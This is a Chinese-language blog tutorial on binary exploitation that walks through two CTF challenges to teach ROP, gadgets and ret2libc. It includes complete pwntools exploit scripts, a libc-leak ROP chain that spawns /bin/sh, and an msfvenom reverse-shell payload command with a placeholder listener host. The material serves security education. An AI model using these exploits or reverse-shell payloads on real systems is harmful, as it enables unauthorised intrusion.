---
title: PWN 入門 - rop, gadget 是什麼？
author: crystal
date: 2021-10-21
tags: [Security, Reverse Engineering, Binary Exploitation]
layout: layouts/post.njk
image: /img/posts/crystal/pwn-intro/cover-1.jpg
---
<!-- summary -->
摸過兩題 pwn 之後，你發現大多數的題目根本不能輕輕鬆鬆就跳到某個開 shell 的函數或是執行你寫的 shellcode。你看的 writeup 裡都刻了好多奇怪的記憶體位置，連成好大一串 input，他們在幹嘛？今天我們來初探 ROP 與 gadget 的世界。
<!-- summary -->


在開始之前，請先閱讀 Reverse 101 的基礎篇：[**Reverse Engineering 101 — Part 1**](https://tech-blog.cymetrics.io/posts/crystal/reverse-01)，學習 pwn 的時候，了解記憶體分配與程式的運作方式是很重要的。

如果對 pwn 還沒有點概念的話，也建議先看一下前一篇：[**PWN 入門 - buffer overflow 是什麼？**](https://tech-blog.cymetrics.io/posts/crystal/pwn-intro)

## more shellcode - YABO

剛玩過一點 shellcode 覺得太單純沒有實感，這次我們來看另一題需要 buffer overflow 才能觸發的 shellcode 題。這是 2021 Hactivitycon CTF 的 YABO，可以到[這裡](https://github.com/OneDegree-Global/medium-resources/blob/main/pwn/YABO)下載。

這題跑起來之後會起一個 server，你可以偵測電腦開的 port 發現 server 聽在 9999 上，連過去就可以對話。

#[running yabo](/img/posts/crystal/pwn-intro/yabo-run.png)

我們一樣用 Ghidra 打開來看，不過這裡就省略 server 接收 connection 的部分，直接進到跟 client 對話的 `vuln()` 函數：

```c
void vuln(int param_1)
{
  char input_buffer [1024];
  size_t recv_result;
  char *recv_buf;
  
  recv_buf = (char *)0x0;
  recv_buf = (char *)malloc(0xf00);
  if (recv_buf == (char *)0x0) {
    perror("Memory error");
  }
  else {
    send(param_1,"What would you like to say?: ",0x1d,0);
    recv_result = recv(param_1,recv_buf,0xeff,0);
    if (recv_result == -1) {
      perror("recv error");
      free(recv_buf);
    }
    else {
      strcpy(input_buffer,recv_buf);
    }
  }
  return;
}
```

邏輯很簡單，先用一個 `malloc()` 得到的 `recv_buf` 接收 socket 傳過來的內容，如果沒有報錯的話才把內容複製一份到 stack 上的 local buffer。

看一下保護機制，發現什麼都沒開，表示我們可以用前一題的 shellcode 手法來 RCE，而且記憶體位置固定，所以如果有可以利用的地址或空間就能直接跳過去。

#[checksec](/img/posts/crystal/pwn-intro/yabo-checksec.png)

這裡沒有像 `puts()` 一樣可以寫無限多輸入的地方，那程式的弱點在哪？

答案是：記憶體內容被複製時的空間差異。

在最後 `strcpy(input_buffer,recv_buf);` 的地方，`recv_buf` 的內容被複製一份填到 `input_buffer` 裡，但是 `recv_buf` 的大小吃了 0xeff，比 `input_buffer` 的 1024 大很多，所以如果我們從 client 端送到程式裡的字串大於 1024 ，`strcpy()` 後就會覆蓋 stack 上的其他空間，最後成功蓋過 return address。

辨識弱點後就來嘗試蓋過 return address 找到會 segfault 的 offset 吧！

我們用 gdb 跑起 YABO，這次換一個方法判斷 offset。gdb 有個好用的指令 `pattern_create` 可以產生出一個任意長度的字串，確保任 4 個 byte 都是 unique 的。

#[create pattern](/img/posts/crystal/pwn-intro/yabo-patterncreate.png)

讓程式執行起來，然後從 client 端把剛剛產生的送進去，就會在 gdb 裡看到噴出 segfault。

#[segfault](/img/posts/crystal/pwn-intro/yabo-segfault.png)

在框起來的地方可以看到 segfault 是因為蓋過 return address 所以邏輯跑到了不包含指令的奇怪地方。我們可以繼續用 gdb 的指令 `pattern_offset` 來快速知道這個被覆蓋的位置是剛剛那一大堆字串的第幾個位元：

#[pattern offset](/img/posts/crystal/pwn-intro/yabo-patternoffset.png)

這下我們知道要 overflow 的形式就是 `'A'*1044 + retaddr`，只要把原本的 return address 換成我們寫的 shellcode 的位置就可以啦！

### where to put shellcode?

不過，我們的 shellcode 要放哪裡呢？因為存放輸入的地方在 stack 上，所以我們沒辦法事先知道 `input_buffer` 的位置，`recv_buf` 用的是 heap 空間同樣也沒辦法簡單觀察出來。

這裡就要介紹一個新的概念：gadget。

> 當我們沒辦法直接執行自己 inject 進去的指令時，就可以利用這個檔案裡面本來就有的程式片段來湊出我們想執行的功能，這些『片段』就稱為 gadget。

後續在講 ROP(Return Oriented Programming) 的部分時我們會更深入地提到如何建構出完整的 ROP chain 達成 RCE，這裡就先以解題用到的部分讓大家感受一下。

回到剛剛發生 segfault 的地方，如果你仔細看會發現此時的 `esp` 跟 `edx` 都指到的我們剛剛輸入的字串的一部分，也就是說這兩個暫存器裡面的值是我們可以控制的，所以如果我們把 shellcode 放在 `esp` 跟 `edx` 的位置，然後找到某個寫著 `jmp esp` 或 `jmp edx` 的 gadget，就能把 program control flow 導引到 shellcode 達成 RCE 啦！

#[esp](/img/posts/crystal/pwn-intro/yabo-esp.png)

更甚，你可以稍微檢視一下 `esp` 附近的記憶體空間，就會發現在我們剛剛 overflow 的 return address 的下一塊就緊接著  `esp`！只要能找到可用的 gadget 我們的拼圖就完成了，用 `'A'*1044 + gadget + shellcode` 就能 RCE！

#[esp offset](/img/posts/crystal/pwn-intro/yabo-espoffset.png)

找 gadget 可以用 `ROPgadget` 這個指令：

#[gadget](/img/posts/crystal/pwn-intro/yabo-gadget.png)

最後一步就是產生 shellcode 啦！這一次我們要的功能是開一個 reverse shell 的連線到我們的機器，可以用 msfvenom 來完成：
`msfvenom -p linux/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -b '\x00\x0A\x0D' -f python -v sc –e x86/shikata_ga_nai`

這裡的 IP 要是 public 的，所以如果你有自己的機器最好，不然也可以用 ngrok 這個工具來暫時創建一個 tunnel，這樣就會獲得一個公開的 domain name 跟 IP 可以使用。把要連線的 IP 跟 PORT 填進去就可以獲得自己專屬的 reverse shell payload 啦！

另外要注意的是，剛用 msfvenom 的時候有做 payload encoding (`–e x86/shikata_ga_nai`)，所以 shellcode 實際執行的時候會先把自己 decode 一次，會覆寫到 shellcode 前後一些空間，所以我們通常會在 shellcode 前加一段 nop sled（就是一串 `'\x90'` 的空白 padding 而已）來避免影響到前面 return address 等等的部分。

綜合上面的步驟，我們的 exploit 就完成啦！

```python
from pwn import *

#p = process('./retcheck')
#p = remote('127.0.0.1', 9999)
p= remote('challenge.ctf.games', 32762)

nopsled = "\x90"*10
# generate your own shellcode and insert here!
sc =  b""

# 0x080492e2 : jmp esp
gadget = 0x080492e2
buf = b'A'*1044 + p32(gadget) + nopsled + sc
p.sendlineafter("What would you like to say?: ", buf)
p.interactive()
```

## rop

ROP (Return Oriented Programming) 不是在討論程式語言跟特性嗎，跟 pwn 有什麼關係？

還記得我們剛剛為什麼去找 `jmp esp` 的 gadget 嗎？因為 instruction pointer (eip rip) 指向的是下一個指令的位置，所以我們如果能在檔案中找到想要執行的指令片段，就可以讓 instruction pointer 指到這個片段的地址，進而執行相應的組語指令。

那要怎麼填充 instruction pointer 呢？在組語中，呼叫 `ret` 這個指令就會把 stack 上的下一塊記憶體內容放到 instruction pointer，所以我們如果把很多個以 `ret` 結尾的 gadget 的地址串在一起，就可以組合出一系列的指令，這樣 "return-oriented" 的 pwn 手法，就稱為 ROP chain。

還是不太懂這是如何運作的？我們用下面幾張圖看看要達成 `foo(2,1)` 的 ROP chain 跑起來的樣子：

首先，當記憶體被 overflow，當前的函數跑到 `ret` 時，等效於 `pop rip` 將 return address 裡寫的地址（`0x507070`）寫入 `rip`，此時 `rsp` 下移指到下一塊記憶體 `0x1`。
程式接下來就會從 `0x507070` 的指令開始繼續執行。第一步的 `pop rax` 會從 stack 上再拿一個值下來填到 `rax` 裡，於是 `0x1` 就會被放進 `rax`，`rsp` 下移指到 `0x2`。第二步的 `pop rdi` 同樣道理， `0x2` 會被放進 `rdi`，`rsp` 繼續下移。第三步又遇到 `ret`，於是下一個 stack 上的值放到 `rip`，第一個 gadget 執行結束，控制權回到我們的 ROP chain。

#[gadget #1](/img/posts/crystal/pwn-intro/rop-1.png)

來到第二個 gadget，第一個指令 `mov rax, rsi` 將前一步填好的 `rax` 內容複製一份到 `rsi`，再來 `pop rdx` 把 `foo()` 的記憶體位置填充到 `rdx`，最後用 `ret` 結束這個 gadget。

#[gadget #2](/img/posts/crystal/pwn-intro/rop-2.png)

這下我們需要的輸入參數都就位了，只要能呼叫 `foo()` 就成功啦。我們串接的第三個 gadget 就是用 `call rdx` 來觸發，成功達成執行 `foo(2,1)` 的目的。

#[gadget #3](/img/posts/crystal/pwn-intro/rop-3.png)

在 exploit 的時候，我們就是在利用 gadget 的串接拼湊出想要執行的組語指令，畢竟不能執行外部的 shellcode，只用自己內部的可就沒有問題啦！ROP chain 的威力之強大，我們用下一題讓你看一下。

## ret2libc

一樣來自 2021 Hactivitycon CTF，這題有兩個檔案，第一個是程式的[執行檔](https://github.com/OneDegree-Global/medium-resources/blob/main/pwn/the_library)，第二個是程式的 [libc .so 檔](https://github.com/OneDegree-Global/medium-resources/blob/main/pwn/libc-2.31.so)。

執行起來會請使用者猜一個隨機數，猜錯會輸出 "wrong" 然後結束。

#[running the_library](/img/posts/crystal/pwn-intro/thelib-run.png)

有請 Ghidra：

```c
int main(void)
{
    int iVar1;
    char local_228 [520];
    uint local_20;
    int local_1c;
    FILE *local_18;
    int local_c;
    
    local_18 = (FILE *)0x0;
    local_18 = fopen("/dev/urandom","r");
    if (local_18 == (FILE *)0x0) {
                        /* WARNING: Subroutine does not return */
        exit(1);
    }
    fread(&local_20,4,1,local_18);
    fclose(local_18);
    srand(local_20);
    puts("Welcome to The Library.\n");
    puts("Books:");
    for (local_c = 0; local_c < 6; local_c = local_c + 1) {
        printf("%d. %s\n",(ulong)(local_c + 1),*(undefined8 *)(BOOKS + (long)local_c * 8));
    }
    puts("");
    puts("I am thinking of a book.");
    puts("Which one is it?");
    printf("> ");
    gets(local_228);
    local_1c = atoi(local_228);
    iVar1 = rand();
    if (local_1c == iVar1 % 5 + 1) {
        puts("Correct!");
    }
    else {
        puts("Wrong :(");
    }
    return 0;
}
```

不管是猜對還是猜錯程式都會直接結束，所以我們的重點應該放在危險的 `gets(local_228);` 這一行。因為 `gets()` 不限長度，所以我們可以透過比分配的 `520` 更長的輸入來達到 overflow 的目的。一樣先用 gdb 的 `pattern_create` 跟 `pattern_offset` 找到實際 overflow 需要的長度跟 return address 的位置，這次我們就不示範放圖了，大家可以練習自己找找看。

再來看一下保護機制，這次沒有 shellcode 可以用了，不過也沒有 PIE 所以檔案裡面的函數等位置是固定的，看來是時候用 ROP 一決勝負啦！

#[checksec](/img/posts/crystal/pwn-intro/thelib-checksec.png)

這裡要用到另一個技巧： ret2libc(return to libc)，也就是透過標準函式庫 libc 裡面的 `system()` 來做到開 shell。 linux 的程式大多都會用到某一版本的 libc，而這個函式庫會在 binary 要開始跑起來的時候被 load 到記憶體裡面，並將使用到的函數寫到 GOT 表中。因為有 ASLR (Address space layout randomization) 的關係，libc 載入的位置會每次檔案跑起來都會隨機分配，所以我們沒辦法預先知道 libc 會在哪個地址。因此，如果要執行 libc 的函數，我們必須先想辦法洩露出 libc 載入的位置。

### leaking libc

哪裡會寫著 libc 函數的位置呢？最直覺的地點就是 GOT 表。

如果我們能讀取 GOT 表中某一個 libc 函數的位置，就可以透過 libc 函數之間的相對位置找到我們要的 `system()` 在哪。建構 ROP chain 的方法很簡單，比照前面的範例，要呼叫一個函數，只要把對應的參數位置放到 `rdi` 跟 `rsi` 等暫存器，然後跳到函數所在的位置就好了。我們想要『洩露』某個地址，想當然就是用可以印出東西的函數： `puts()` 跟 `printf()`，那要洩漏的地址就可以隨便放一個有在 GOT 表的 libc 函數。

這裡我決定用 `puts()` 來洩漏 `puts()` 自己的位置，你可以用前面提過的 `ROPgadget` 找到 `pop rdi` gadget 的位置，然後透過觀察 assembly 中的內容得到 `puts()` 的地址，或是乾脆用 pwntools 的 ELF class：

```python
from pwn inport *

context.log_level = 'DEBUG'

elf = ELF('the_library')
poprdi = 0x00401493
puts_got = elf.got['puts']
puts_plt = elf.plt['puts']
rop = b'A'*552 + p64(poprdi) + p64(puts_got) + p64(puts_plt)
```

你可以試著送送看然後接收印出來的東西，看到在框起來的部分有六個印出來的 bytes，這就是我們洩露出 `puts()` 在 libc 的位置：

#[leak libc](/img/posts/crystal/pwn-intro/thelib-leak.png)

小提示，地址都是 8 bytes 的，但如果前面有 `'\x00'` 的話就不會印出來，所以雖然我們收到的只有 6 bytes，但要自己一下處理把它變成正常的 8 bytes 格式方便做後續運算：`libc = u64(p.recv(8)[:6] + '\x00\x00')`

可是可是，雖然成功洩漏 libc，但程式結束了呀！要是從來一次不就又會換一次地址了嗎？我們哪裡有機會再 overflow 一次？

沒錯，所以我們不能讓程式結束。只能輸入一次不夠，我們輸入無限次可以了吧？剛剛的 `puts_plt` 結束之後，我們的 ROP chain 還可以繼續，我們讓程式『回到 `main()` 再來一次』不就好了嗎？

把剛剛的 ROP chain 加一個 gadget，多一個希望：

```python
elf = ELF('the_library')
poprdi = 0x00401493
puts_got = elf.got['puts']
puts_plt = elf.plt['puts']
main = elf.sym['main']
rop = b'A'*552 + p64(poprdi) + p64(puts_got) + p64(puts_plt) + p64(main)

print(hex(u64(p.recv(8)[:6] + '\x00\x00')))
```

果然成功了，再來一次：

#[main again!](/img/posts/crystal/pwn-intro/thelib-again.png)

再來就是要最關鍵的開 shell 方程式！我們要用第二次的 ROP chain 創造出 `system('/bin/sh');`，因此需要先知道 `puts()` 在提供的 libc 中的位置，進而算出 `system()` 在哪。同時，還要找到 `'/bin/sh'` 字串的位置，能用 libc 當然最好，沒有的話就要自己想辦法寫入記憶體中。

不同版本跟 distribution 的 linux 會用到不同的 libc，而不同的 libc 中函數與變數的 offset 也不同，所以要準確知道目標系統上運行的 libc 版本才能計算出對的地址。這題之所以附上一個 libc .so 檔也就是為了讓我們可以從 libc 版本明確算出函數位置。如果沒有附的話，通常也可以透過其他檔案，例如 Dockerfile 用的 image 來推論，然後用一些線上的資料庫查詢 offset：[libc database search](https://libc.blukat.me/)、[libc.rip](https://libc.rip/)、[libc nullbyte](https://libc.nullbyte.cat/)

要知道 libc 中函數位置也有手動跟 pwntools 兩種方式。

手動的話可以用 `readelf` 來查詢：

#[libc offset](/img/posts/crystal/pwn-intro/thelib-offset.png)

用 pwntools 的話簡單一些：

```python
libc = ELF("libc-2.31.so")
libc.address = u64(p.recv(8)[:6] + '\x00\x00') - libc.sym['puts'] 

system = libc.sym["system"]
exit = libc.sym["exit"]
binsh = next(libc.search("/bin/sh")) 
```

萬事俱備，只欠東風，ROP chain 兜起來看看（`exit()` 只是讓開的 shell 可以優雅結束，沒有其實也沒關係）。記得 local 測試的時候要把 libc 換成自己的，可以用 `ldd the_library` 找到對應的 libc.so，然後替換掉剛剛在 pwntools 設定的 ELF：

```python
# use YOUR local libc!!
# ldd the_library: libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f1e17b29000)
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
...
buf = b'A'*552 + p64(poprdi) + p64(binsh) + p64(system) + p64(exit)
p.sendline(buf)
p.interactive()
```

完成啦！跑起來看看！

#[alignment](/img/posts/crystal/pwn-intro/thelib-align.png)

咦，怎麼又是 EOF 然後 segfault？

在 64 bit 的環境呼叫 libc 函數，例如 `system()` `printf()` 的時候，如果記憶體沒有 16 byte 對齊，就會在 `movaps` 指令發生 segfault。你可以在 gdb 裡跟進看看執行到 `system()` 的時候 `rsp` 尾數是不是 0 ，不是的話就表示現在的 stack 並不符合 alignment。更多常見的小陷阱可以參考這個很棒的 ROP 教學網站：[ROP Emporium](https://ropemporium.com/guide.html#Common%20pitfalls)

要修復這個問題很簡單，我們可以在前面加一個 `ret;` 的 gadget，等效做一次 nop 把後面的 ROP chain 往後推一格，這樣跑到 `system()` 就會是對齊的狀態啦！

#[get SHELL](/img/posts/crystal/pwn-intro/thelib-flag.png)

exploit 如下：

```python
from pwn import *

context.os = 'linux'

p = process('./the_library')
#p= remote('challenge.ctf.games', 31125)

elf = ELF('the_library')
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
#libc = ELF("libc-2.31.so")

# poprdi gadget: 0x00401493 : (b'5fc3')	pop rdi; ret
poprdi = 0x00401493
ret = 0x0040101a

# leak libc_base
puts_got = elf.got['puts']
puts_plt = elf.plt['puts']
main = elf.sym['main']
buf = b'A'*552 + p64(poprdi) + p64(puts_got) + p64(puts_plt) + p64(main)

p.sendlineafter('> ', buf)
print(p.recvline())

libc.address = u64(p.recv(8)[:6] + '\x00\x00') - libc.symbols['puts'] 
print(hex(libc.address))

system = libc.sym["system"]
exit = libc.sym["exit"]
binsh = next(libc.search("/bin/sh")) 

buf = b'A'*552 + p64(ret) + p64(poprdi) + p64(binsh) + p64(system) 
p.clean()
p.sendline(buf)
p.interactive()
```

## 結語

目前介紹了 stack 題的幾個基本概念，讓大家初探 pwn 世界的奧妙與神奇。Buffer overflow 這個看似簡單的漏洞造成的危害可能是非常致命的，大家可以想想自己的程式中有沒有用到危險的函數、使用者的輸入有沒有做好檢查。

覺得 pwn 有趣的話，推薦大家可以去玩 [pwntable.tw](https://pwnable.tw/) 上的題目！
